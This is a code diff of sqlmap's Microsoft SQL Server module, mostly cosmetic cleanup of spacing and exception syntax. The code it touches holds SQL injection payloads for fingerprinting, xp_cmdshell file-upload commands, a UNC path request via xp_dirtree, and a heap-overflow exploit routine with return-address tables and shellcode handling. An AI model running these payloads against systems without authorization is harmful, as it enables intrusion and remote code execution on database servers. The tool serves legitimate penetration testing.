@@ -22,8 +22,6 @@ with sqlmap; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 
-
-
 import binascii
 import os
 import time
@@ -71,7 +69,6 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
         unescaper.setUnescape(MSSQLServerMap.unescape)
 
-
     @staticmethod
     def unescape(expression, quote=True):
         if quote:
@@ -84,7 +81,7 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
                 index = expression[firstIndex:].find("'")
 
                 if index == -1:
-                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression
+                    raise sqlmapSyntaxException("Unenclosed ' in '%s'" % expression)
 
                 lastIndex = firstIndex + index
                 old = "'%s'" % expression[firstIndex:lastIndex]
@@ -103,7 +100,6 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
         return expression
 
-
     @staticmethod
     def escape(expression):
         while True:
@@ -115,7 +111,7 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
             index = expression[firstIndex:].find("))")
 
             if index == -1:
-                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression
+                raise sqlmapSyntaxException("Unenclosed ) in '%s'" % expression)
 
             lastIndex = firstIndex + index + 1
             old = expression[firstIndex:lastIndex]
@@ -128,9 +124,8 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
         return expression
 
-
     def getFingerprint(self):
-        value  = ""
+        value = ""
         wsOsFp = formatFingerprint("web server", kb.headersFp)
 
         if wsOsFp:
@@ -142,23 +137,23 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
             if dbmsOsFp:
                 value += "%s\n" % dbmsOsFp
 
-        value  += "back-end DBMS: "
-        actVer  = formatDBMSfp()
+        value += "back-end DBMS: "
+        actVer = formatDBMSfp()
 
         if not conf.extensiveFp:
             value += actVer
             return value
 
-        blank       = " " * 15
-        value      += "active fingerprint: %s" % actVer
+        blank = " " * 15
+        value += "active fingerprint: %s" % actVer
 
         if kb.bannerFp:
-            release     = kb.bannerFp["dbmsRelease"]
-            version     = kb.bannerFp["dbmsVersion"]
+            release = kb.bannerFp["dbmsRelease"]
+            version = kb.bannerFp["dbmsVersion"]
             servicepack = kb.bannerFp["dbmsServicePack"]
 
             if release and version and servicepack:
-                banVer  = "Microsoft SQL Server %s " % release
+                banVer = "Microsoft SQL Server %s " % release
                 banVer += "Service Pack %s " % servicepack
                 banVer += "version %s" % version
 
@@ -170,7 +165,6 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
             value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)
 
         return value
-
 
     def checkDbms(self):
         if conf.dbms in MSSQL_ALIASES and kb.dbmsVersion and kb.dbmsVersion[0].isdigit():
@@ -189,29 +183,29 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
         payload = agent.fullPayload(" AND LEN(@@VERSION)=LEN(@@VERSION)")
         result  = Request.queryPage(payload)
 
-        if result == True:
+        if result:
             infoMsg = "confirming Microsoft SQL Server"
             logger.info(infoMsg)
 
-            for version in ( 0, 5, 8 ):
+            for version in (0, 5, 8):
                 randInt = randomInt()
                 query   = " AND %d=(SELECT (CASE WHEN (( SUBSTRING((@@VERSION), 22, 1)=2 AND SUBSTRING((@@VERSION), 25, 1)=%d ) OR ( SUBSTRING((@@VERSION), 23, 1)=2 AND SUBSTRING((@@VERSION), 26, 1)=%d )) THEN %d ELSE %d END))" % (randInt, version, version, randInt, (randInt + 1))
                 payload = agent.fullPayload(query)
                 result  = Request.queryPage(payload)
 
-                if result is True:
+                if result:
                     if version == 8:
-                        kb.dbmsVersion = [ "2008" ]
+                        kb.dbmsVersion = ["2008"]
 
                         break
 
                     elif version == 5:
-                        kb.dbmsVersion = [ "2005" ]
+                        kb.dbmsVersion = ["2005"]
 
                         break
 
                     elif version == 0:
-                        kb.dbmsVersion = [ "2000" ]
+                        kb.dbmsVersion = ["2000"]
 
                         break
 
@@ -220,8 +214,8 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
                         payload = agent.fullPayload(query)
                         result  = Request.queryPage(payload)
 
-                        if result == True:
-                            kb.dbmsVersion = [ "7.0" ]
+                        if result:
+                            kb.dbmsVersion = ["7.0"]
 
                         break
 
@@ -241,7 +235,6 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
             return False
 
-
     def checkDbmsOs(self, detailed=False):
         if kb.os and kb.osVersion and kb.osSP:
             return
@@ -249,7 +242,7 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
         if not kb.os:
             kb.os = "Windows"
 
-        if detailed == False:
+        if not detailed:
             return
 
         infoMsg  = "fingerprinting the back-end DBMS operating system "
@@ -261,14 +254,12 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
         self.createSupportTbl(self.fileTblName, self.tblField, "varchar(1000)")
         inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "@@VERSION"))
 
-        versions = {
-                     "2003": ( "5.2", ( 2, 1 ) ),
-                     #"2003": ( "6.0", ( 2, 1 ) ),
-                     "2008": ( "7.0", ( 1, ) ),
-                     "2000": ( "5.0", ( 4, 3, 2, 1 ) ),
-                     "XP":   ( "5.1", ( 2, 1 ) ),
-                     "NT":   ( "4.0", ( 6, 5, 4, 3, 2, 1 ) )
-                   }
+        versions = {"2003": ("5.2", (2, 1)),
+                    #"2003": ("6.0", (2,1)),
+                    "2008": ("7.0", (1,)),
+                    "2000": ("5.0", (4, 3, 2, 1)),
+                    "XP": ("5.1", (2, 1)),
+                    "NT": ("4.0", (6, 5, 4, 3, 2, 1))}
 
         # Get back-end DBMS underlying operating system version
         for version, data in versions.items():
@@ -320,14 +311,12 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
         self.cleanup(onlyFileTbl=True)
 
-
     def getPrivileges(self):
         warnMsg  = "on Microsoft SQL Server it is not possible to fetch "
         warnMsg += "database users privileges"
         logger.warn(warnMsg)
 
         return {}
-
 
     def getTables(self):
         infoMsg = "fetching tables"
@@ -399,16 +388,14 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
         if not kb.data.cachedTables:
             errMsg = "unable to retrieve the tables for any database"
-            raise sqlmapNoneDataException, errMsg
+            raise sqlmapNoneDataException(errMsg)
 
         return kb.data.cachedTables
-
 
     def unionReadFile(self, rFile):
         errMsg  = "Microsoft SQL Server does not support file reading "
         errMsg += "with UNION query SQL injection technique"
-        raise sqlmapUnsupportedFeatureException, errMsg
-
+        raise sqlmapUnsupportedFeatureException(errMsg)
 
     def stackedReadFile(self, rFile):
         infoMsg = "fetching file: '%s'" % rFile
@@ -479,7 +466,7 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
             if not count.isdigit() or not len(count) or count == "0":
                 errMsg  = "unable to retrieve the content of the "
                 errMsg += "file '%s'" % rFile
-                raise sqlmapNoneDataException, errMsg
+                raise sqlmapNoneDataException(errMsg)
 
             indexRange = getRange(count)
 
@@ -491,12 +478,10 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
         return result
 
-
     def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
         errMsg  = "Microsoft SQL Server does not support file upload with "
         errMsg += "UNION query SQL injection technique"
-        raise sqlmapUnsupportedFeatureException, errMsg
-
+        raise sqlmapUnsupportedFeatureException(errMsg)
 
     def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
         # NOTE: this is needed here because we use xp_cmdshell extended
@@ -525,11 +510,9 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
             logger.debug("moving binary file %s to %s" % (sFile, dFile))
 
-            commands   = (
-                           "cd %s" % tmpPath,
-                           "ren %s %s" % (chunkName, dFileName),
-                           "move /Y %s %s" % (dFileName, dFile)
-                         )
+            commands   = ("cd %s" % tmpPath,
+                          "ren %s %s" % (chunkName, dFileName),
+                          "move /Y %s %s" % (dFileName, dFile))
             complComm  = " & ".join(command for command in commands)
             forgedCmd  = self.xpCmdshellForgeCmd(complComm)
 
@@ -545,7 +528,7 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
             counter = 1
 
             for i in range(0, wFileSize, debugSize):
-                wFileChunk = wFileContent[i:i+debugSize]
+                wFileChunk = wFileContent[i:i + debugSize]
                 chunkName  = self.updateBinChunk(wFileChunk, tmpPath)
 
                 if i == 0:
@@ -558,11 +541,9 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
                 infoMsg += "%s\%s to %s\%s" % (tmpPath, chunkName, tmpPath, dFileName)
                 logger.debug(infoMsg)
 
-                commands   = (
-                               "cd %s" % tmpPath,
+                commands   = ("cd %s" % tmpPath,
                                copyCmd,
-                               "del /F %s" % chunkName
-                             )
+                               "del /F %s" % chunkName)
                 complComm  = " & ".join(command for command in commands)
                 forgedCmd  = self.xpCmdshellForgeCmd(complComm)
 
@@ -576,23 +557,19 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
             logger.debug("moving binary file %s to %s" % (sFile, dFile))
 
-            commands  = (
-                          "cd %s" % tmpPath,
-                          "move /Y %s %s" % (dFileName, dFile)
-                        )
+            commands  = ("cd %s" % tmpPath,
+                         "move /Y %s %s" % (dFileName, dFile))
             complComm = " & ".join(command for command in commands)
             forgedCmd = self.xpCmdshellForgeCmd(complComm)
 
             self.execCmd(forgedCmd)
 
-        if confirm == True:
+        if confirm:
             self.askCheckWrittenFile(wFile, dFile, fileType)
-
 
     def uncPathRequest(self):
         #inject.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath, silent=True)
         inject.goStacked("EXEC master..xp_dirtree '%s'" % self.uncPath)
-
 
     def spHeapOverflow(self):
         """
@@ -603,19 +580,19 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
 
         returns = {
                     # 2003 Service Pack 0
-                    "2003-0": ( "" ),
+                    "2003-0": (""),
 
                     # 2003 Service Pack 1
-                    "2003-1": ( "CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)", "CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)" ),
+                    "2003-1": ("CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)", "CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)" ),
 
                     # 2003 Service Pack 2 updated at 12/2008
-                    #"2003-2": ( "CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)" ),
+                    #"2003-2": ("CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)" ),
 
                     # 2003 Service Pack 2 updated at 05/2009
-                    "2003-2": ( "CHAR(0xc3)+CHAR(0xdb)+CHAR(0x67)+CHAR(0x77)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x47)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)" )
+                    "2003-2": ("CHAR(0xc3)+CHAR(0xdb)+CHAR(0x67)+CHAR(0x77)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x47)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)")
 
                     # 2003 Service Pack 2 updated at 09/2009
-                    #"2003-2": ( "CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)", "CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)" ),
+                    #"2003-2": ("CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)", "CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)"),
                   }
         addrs = None
 
@@ -633,7 +610,7 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeov
             errMsg += "overflow because it does not have a valid return "
             errMsg += "code for the underlying operating system (Windows "
             errMsg += "%s Service Pack %d)" % (kb.osVersion, kb.osSP)
-            raise sqlmapUnsupportedFeatureException, errMsg
+            raise sqlmapUnsupportedFeatureException(errMsg)
 
         shellcodeChar = ""
         hexStr        = binascii.hexlify(self.shellcodeString[:-1])
